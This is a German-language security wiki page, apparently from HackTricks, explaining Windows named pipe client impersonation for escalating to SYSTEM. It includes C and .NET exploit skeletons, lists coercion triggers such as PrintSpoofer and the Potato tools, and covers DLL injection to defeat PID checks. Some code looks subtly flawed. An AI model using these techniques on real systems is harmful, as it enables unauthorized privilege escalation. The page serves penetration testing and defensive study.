# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation ist ein primitives Mittel zur lokalen Privilegieneskalation, das einem Named-Pipe-Server-Thread erlaubt, den Sicherheitskontext eines Clients anzunehmen, der sich mit ihm verbindet. In der Praxis kann ein Angreifer, der Code mit SeImpersonatePrivilege ausführen kann, einen privilegierten Client (z. B. einen SYSTEM-Dienst) dazu bringen, sich mit einer vom Angreifer kontrollierten Pipe zu verbinden, ImpersonateNamedPipeClient aufzurufen, das resultierende Token in ein primäres Token zu duplizieren und einen Prozess als der Client zu starten (oft NT AUTHORITY\SYSTEM).

Diese Seite konzentriert sich auf die Kerntechnik. Für End-to-End-Exploit-Ketten, die SYSTEM dazu bringen, sich mit Ihrer Pipe zu verbinden, siehe die unten referenzierten Potato family pages.

## TL;DR
- Erstelle eine named pipe: \\.\pipe\<random> und warte auf eine Verbindung.
- Bring eine privilegierte Komponente dazu, sich damit zu verbinden (spooler/DCOM/EFSRPC/etc.).
- Lese mindestens eine Nachricht aus der Pipe, rufe dann ImpersonateNamedPipeClient auf.
- Öffne das Impersonation-Token des aktuellen Threads, DuplicateTokenEx(TokenPrimary) und CreateProcessWithTokenW/CreateProcessAsUser, um einen SYSTEM-Prozess zu erhalten.

## Requirements and key APIs
- Typischerweise vom aufrufenden Prozess/Thread benötigte Privilegien:
- SeImpersonatePrivilege, um erfolgreich einen verbindenden Client zu impersonieren und CreateProcessWithTokenW zu verwenden.
- Alternativ kann man nach der Impersonation von SYSTEM CreateProcessAsUser verwenden, was SeAssignPrimaryTokenPrivilege und SeIncreaseQuotaPrivilege erfordern kann (diese Privilegien sind erfüllt, wenn man SYSTEM impersoniert).
- Kern-APIs, die verwendet werden:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (es muss mindestens eine Nachricht gelesen werden, bevor impersoniert wird)
- ImpersonateNamedPipeClient und RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW oder CreateProcessAsUser
- Impersonation-Ebene: Um lokal sinnvolle Aktionen durchzuführen, muss der Client SecurityImpersonation erlauben (Standard für viele lokale RPC-/named-pipe-Clients). Clients können dies beim Öffnen der Pipe mit SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION absenken.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes:
- Wenn ImpersonateNamedPipeClient ERROR_CANNOT_IMPERSONATE (1368) zurückgibt, stelle sicher, dass du zuerst aus der Pipe liest und dass der Client die Impersonation nicht auf Identification level beschränkt hat.
- Bevorzuge DuplicateTokenEx mit SecurityImpersonation und TokenPrimary, um ein primary token zu erstellen, das für die Prozess-Erstellung geeignet ist.

## .NET Kurzbeispiel
In .NET kann NamedPipeServerStream via RunAsClient impersonate. Sobald impersonating aktiv ist, dupliziere das Thread-Token und erstelle einen Prozess.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
Diese Techniken zwingen privilegierte Dienste dazu, sich mit deiner named pipe zu verbinden, damit du dich als sie ausgeben kannst:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Detaillierte Nutzung und Kompatibilität findest du hier:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Wenn du nur ein vollständiges Beispiel suchst, das das Erstellen der pipe und das Impersonieren zum Spawnen von SYSTEM durch einen Service-Trigger zeigt, siehe:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (DLL Injection, API Hooking, PID Validation Bypass)

Named-pipe gehärtete Dienste können dennoch übernommen werden, indem man den vertrauenswürdigen Client instrumentiert. Tools like [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) legen eine Hilfs-DLL in den Client, proxyen dessen Traffic und erlauben es, privilegierte IPC zu manipulieren, bevor der SYSTEM-Dienst sie verarbeitet.

### Inline API hooking inside trusted processes
- Injiziere die Hilfs-DLL (OpenProcess → CreateRemoteThread → LoadLibrary) in einen beliebigen Client.
- Die DLL verwendet Detours, um `ReadFile`, `WriteFile` usw. zu hooken, aber nur wenn `GetFileType` `FILE_TYPE_PIPE` meldet; sie kopiert jedes Buffer/Metadatum in eine Steuer-Pipe, ermöglicht das Bearbeiten/Verwerfen/Neu-Abspielen und setzt dann die ursprüngliche API fort.
- Verwandelt den legitimen Client in einen Burp-ähnlichen Proxy: pausiere UTF-8/UTF-16/raw-Payloads, löse Fehlerpfade aus, spiele Sequenzen erneut ab oder exportiere JSON-Traces.

### Remote client mode to defeat PID-based validation
- Injeziere in einen allow-listed Client, und wähle dann in der GUI die Pipe plus diese PID.
- Die DLL ruft `CreateFile`/`ConnectNamedPipe` im vertrauenswürdigen Prozess auf und leitet das I/O an dich weiter, sodass der Server weiterhin die legitime PID/Image sieht.
- Umgeht Filter, die auf `GetNamedPipeClientProcessId` oder signed-image-Checks basieren.

### Fast enumeration and fuzzing
- `pipelist` enumeriert `\\.\pipe\*`, zeigt ACLs/SIDs und leitet Einträge an andere Module zur sofortigen Prüfung weiter.
- Der pipe client/message composer verbindet sich mit beliebigen Namen und erstellt UTF-8/UTF-16/raw-hex Payloads; importiere erfasste Blobs, verändere Felder und sende erneut, um Deserialisierer oder nicht-authentifizierte Befehlsverben zu finden.
- Die Hilfs-DLL kann einen Loopback-TCP-Listener hosten, sodass Tools/Fuzzer die pipe remote über das Python SDK steuern können.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
Kombiniere die TCP bridge mit VM snapshot restores, um fragile IPC parsers einem Crash-Test zu unterziehen.

### Betriebliche Überlegungen
- Named pipes are low-latency; lange Pausen beim Bearbeiten von Buffern können fragile Dienste in einen Deadlock bringen.
- Die Abdeckung für Overlapped/completion-port I/O ist partiell, daher ist mit Randfällen zu rechnen.
- Injection ist laut und unsigned, behandle es also als Lab-/Exploit-Dev-Hilfe statt als Stealth-Implantat.

## Fehlerbehebung und Fallstricke
- Du musst mindestens eine Nachricht aus der pipe lesen, bevor du ImpersonateNamedPipeClient aufrufst; andernfalls erhältst du ERROR_CANNOT_IMPERSONATE (1368).
- Wenn der Client mit SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION verbindet, kann der Server nicht vollständig impersonate; überprüfe das Impersonation-Level des Tokens mittels GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW erfordert SeImpersonatePrivilege beim Aufrufer. Wenn das mit ERROR_PRIVILEGE_NOT_HELD (1314) fehlschlägt, verwende CreateProcessAsUser nachdem du bereits SYSTEM impersonated hast.
- Stelle sicher, dass der Security-Descriptor deiner pipe es dem Zielservice erlaubt, sich zu verbinden, falls du ihn erhöhst; standardmäßig sind pipes unter \\.\pipe entsprechend der DACL des Servers zugänglich.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)

{{#include ../../banners/hacktricks-training.md}}
